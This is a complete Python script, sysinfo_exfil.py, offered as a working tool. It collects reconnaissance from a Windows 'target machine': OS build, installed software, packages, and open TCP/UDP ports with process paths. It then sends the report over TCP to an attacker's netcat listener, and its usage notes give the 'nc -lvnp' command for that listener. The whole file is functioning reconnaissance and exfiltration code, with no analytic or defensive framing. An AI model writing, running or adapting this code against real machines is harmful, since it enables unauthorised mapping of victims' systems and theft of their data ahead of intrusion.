"""
sysinfo_exfil.py
----------------
Collects OS info, installed applications, and open ports from a Windows machine.
Saves output as sysinfo_report.json locally and sends it to a remote netcat listener.

Usage:
  1. On your listener machine, run:
       nc -lvnp <PORT> > received_report.json
  2. Edit HOST and PORT below, then run this script on the target machine:
       python sysinfo_exfil.py
"""

import socket
import subprocess
import platform
import struct
import sys
import json
import winreg

# ─────────────────────────────────────────────
#  CONFIGURATION  ← Edit these before running
# ─────────────────────────────────────────────
HOST = "192.168.1.100"   # IP of your listener machine
PORT = 4444              # Port your netcat listener is on
# ─────────────────────────────────────────────


def get_os_info() -> dict:
    """Collect OS name, build number, and architecture."""
    data = {
        "system":       platform.system(),
        "node_name":    platform.node(),
        "release":      platform.release(),
        "version":      platform.version(),
        "architecture": platform.machine(),
        "bits":         platform.architecture()[0],
        "processor":    platform.processor(),
        "registry":     {}
    }

    try:
      
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
        for reg_key, label in [
            ("ProductName",    "product_name"),
            ("DisplayVersion", "display_version"),
            ("CurrentBuild",   "current_build"),
            ("UBR",            "update_build_revision"),
            ("BuildLabEx",     "build_lab_ex"),
            ("EditionID",      "edition"),
        ]:
            try:
                data["registry"][label] = winreg.QueryValueEx(key, reg_key)[0]
            except FileNotFoundError:
                pass
        winreg.CloseKey(key)
    except Exception as e:
        data["registry"]["error"] = str(e)

    return data


def get_installed_apps() -> list:
    """Collect installed applications from Windows registry (64-bit, 32-bit, and user hives)."""
    apps = []

    try:

        hive_map = {
            "HKLM": winreg.HKEY_LOCAL_MACHINE,
            "HKCU": winreg.HKEY_CURRENT_USER,
        }
        registry_paths = [
            ("HKLM", r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",             "64bit"),
            ("HKLM", r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall", "32bit"),
            ("HKCU", r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",             "user"),
        ]

        for hive_str, path, source in registry_paths:
            try:
                reg_key = winreg.OpenKey(hive_map[hive_str], path)
                count   = winreg.QueryInfoKey(reg_key)[0]

                for i in range(count):
                    try:
                        sub_key_name = winreg.EnumKey(reg_key, i)
                        sub_key      = winreg.OpenKey(reg_key, sub_key_name)

                        def qval(k, field):
                            try:
                                return winreg.QueryValueEx(k, field)[0]
                            except Exception:
                                return ""

                        name = qval(sub_key, "DisplayName")
                        if name:
                            apps.append({
                                "name":             name,
                                "version":          qval(sub_key, "DisplayVersion"),
                                "publisher":        qval(sub_key, "Publisher"),
                                "install_date":     qval(sub_key, "InstallDate"),
                                "install_location": qval(sub_key, "InstallLocation"),
                                "source":           source
                            })
                        winreg.CloseKey(sub_key)
                    except Exception:
                        continue

                winreg.CloseKey(reg_key)

            except Exception as e:
                apps.append({"error": str(e), "source": source})

    except ImportError as e:
        apps.append({"error": str(e)})

    return sorted(apps, key=lambda x: x.get("name", "").lower())


def get_powershell_packages() -> list:
    """Use PowerShell Get-Package for additional sources (Store, Chocolatey, etc.)."""
    try:
        result = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command",
             "Get-Package | Select-Object Name, Version, ProviderName | ConvertTo-Json -Compress"],
            capture_output=True, text=True, timeout=30
        )
        data = json.loads(result.stdout.strip())
        if isinstance(data, dict):
            data = [data]
        return [
            {
                "name":          p.get("Name", ""),
                "version":       p.get("Version", ""),
                "provider_name": p.get("ProviderName", "")
            }
            for p in data
        ]
    except Exception as e:
        return [{"error": str(e)}]


def get_tcp_ports() -> list:
    """Collect TCP connections/listening ports with process info."""
    ps_cmd = (
        "Get-NetTCPConnection | ForEach-Object {"
        "  $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue;"
        "  [PSCustomObject]@{"
        "    LocalAddr = $_.LocalAddress;"
        "    LocalPort = $_.LocalPort;"
        "    State     = $_.State;"
        "    PID       = $_.OwningProcess;"
        "    Name      = if ($proc) { $proc.Name } else { 'N/A' };"
        "    Path      = if ($proc) { $proc.Path } else { 'N/A' };"
        "  }"
        "} | Sort-Object LocalPort | ConvertTo-Json -Compress"
    )

    try:
        result = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_cmd],
            capture_output=True, text=True, timeout=30
        )
        data = json.loads(result.stdout.strip())
        if isinstance(data, dict):
            data = [data]
        return [
            {
                "local_address": e.get("LocalAddr", ""),
                "local_port":    e.get("LocalPort", ""),
                "state":         e.get("State", ""),
                "pid":           e.get("PID", ""),
                "process_name":  e.get("Name", ""),
                "process_path":  e.get("Path", "")
            }
            for e in data
        ]
    except Exception as e:
        # Fallback to netstat
        try:
            r = subprocess.run(["netstat", "-ano"], capture_output=True, text=True, timeout=15)
            return [{"fallback_netstat_output": r.stdout, "error": str(e)}]
        except Exception as e2:
            return [{"error": str(e), "netstat_error": str(e2)}]


def get_udp_ports() -> list:
    """Collect UDP endpoints with process info."""
    udp_cmd = (
        "Get-NetUDPEndpoint | ForEach-Object {"
        "  $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue;"
        "  [PSCustomObject]@{"
        "    LocalAddr = $_.LocalAddress;"
        "    LocalPort = $_.LocalPort;"
        "    PID       = $_.OwningProcess;"
        "    Name      = if ($proc) { $proc.Name } else { 'N/A' };"
        "  }"
        "} | Sort-Object LocalPort | ConvertTo-Json -Compress"
    )

    try:
        result = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", udp_cmd],
            capture_output=True, text=True, timeout=30
        )
        data = json.loads(result.stdout.strip())
        if isinstance(data, dict):
            data = [data]
        return [
            {
                "local_address": e.get("LocalAddr", ""),
                "local_port":    e.get("LocalPort", ""),
                "pid":           e.get("PID", ""),
                "process_name":  e.get("Name", "")
            }
            for e in data
        ]
    except Exception as e:
        return [{"error": str(e)}]



def build_report() -> dict:
    """Assemble the full report as a structured dictionary."""
    return {
        "os": get_os_info(),
        "installed_apps": get_installed_apps(),
        "ps_packages":    get_powershell_packages(),
        "network": {
            "tcp": get_tcp_ports(),
            "udp": get_udp_ports()
        }
    }


def send_report(report_json: str, host: str, port: int) -> None:
    """Send the JSON report to the netcat listener over TCP."""
    print(f"[*] Connecting to {host}:{port} ...")

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            s.connect((host, port))
            print(f"[+] Connected. Sending report ({len(report_json)} bytes) ...")

            data = report_json.encode("utf-8", errors="replace")

            # 4-byte big-endian length prefix
            s.sendall(struct.pack(">I", len(data)))
            s.sendall(data)

            print("[+] Report sent successfully.")

    except socket.timeout:
        print(f"[-] Connection timed out. Is your listener running on {host}:{port}?")
        sys.exit(1)
    except ConnectionRefusedError:
        print(f"[-] Connection refused. Start your listener: nc -lvnp {port} > received_report.json")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error sending report: {e}")
        sys.exit(1)


def main():
    print("[*] Collecting system information ...")
    report = build_report()

    # Serialize to JSON
    report_json = json.dumps(report, indent=2, default=str)

    # Save locally
    with open("sysinfo_report.json", "w", encoding="utf-8") as f:
        f.write(report_json)
    print("[*] Report saved locally as sysinfo_report.json")

    # Send over network
    send_report(report_json, HOST, PORT)


if __name__ == "__main__":
    main()